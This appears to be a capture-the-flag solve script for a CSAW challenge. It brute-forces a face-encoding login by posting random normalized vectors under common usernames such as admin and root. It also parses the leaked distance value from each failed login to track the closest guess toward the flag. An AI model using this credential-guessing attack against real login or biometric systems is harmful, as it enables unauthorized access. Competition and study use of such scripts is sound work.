import numpy as np
import requests
import json
from time import sleep

def generate_normalized_encoding():
    # Generate random values between -0.15 and 0.15
    encoding = np.random.uniform(-0.15, 0.15, 128)
    # Normalize to L2 norm = 1.0
    encoding = encoding / np.linalg.norm(encoding)
    return encoding.tolist()

def test_encoding(username, encoding):
    url = "http://web.chal.csaw.io:5000"
    payload = {
        "username": username,
        "encoding": encoding
    }
    try:
        response = requests.post(url, json=payload)
        return response.text
    except Exception as e:
        print(f"Error: {e}")
        return None

def extract_distance(response):
    try:
        if "dist" in response:
            # Extract float from format like "Login Failed - {'status': False, 'dist': 0.123}"
            dist_str = response.split("dist': ")[1].split("}")[0]
            return float(dist_str)
    except:
        pass
    return None

def main():
    usernames = ['admin', 'user', 'system', 'root', 'administrator']
    best_distances = {}

    for username in usernames:
        print(f"\nTesting username: {username}")
        best_distance = float('inf')
        best_encoding = None

        # Try multiple random encodings for each username
        for i in range(20):
            encoding = generate_normalized_encoding()
            response = test_encoding(username, encoding)
            print(f"Attempt {i+1}: {response}")

            if response and "Success" in response:
                print(f"SUCCESS! Found valid credentials for {username}")
                print(f"Flag found: {response}")
                return

            distance = extract_distance(response)
            if distance and distance < best_distance:
                best_distance = distance
                best_encoding = encoding
                print(f"New best distance for {username}: {best_distance}")

            # Don't hammer the server
            sleep(0.5)

        if best_distance != float('inf'):
            best_distances[username] = (best_distance, best_encoding)

    # Report best results
    print("\nBest distances found:")
    for username, (distance, encoding) in best_distances.items():
        print(f"{username}: {distance}")

if __name__ == "__main__":
    main()

